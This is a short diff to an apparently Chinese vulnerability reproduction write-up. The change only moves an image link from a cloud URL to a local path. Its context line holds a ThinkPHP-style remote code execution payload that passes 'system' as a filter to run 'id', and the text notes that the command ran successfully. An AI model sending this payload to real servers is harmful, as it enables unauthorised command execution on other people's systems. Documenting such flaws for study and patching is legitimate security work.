@@ -38,7 +38,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 成功执行`id`命令：
 
-![image-20220302151553822](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021515902.png)
+![image-20220302151553822](./images/202203021515902.png)
 
 ## 开源POC/EXP
 
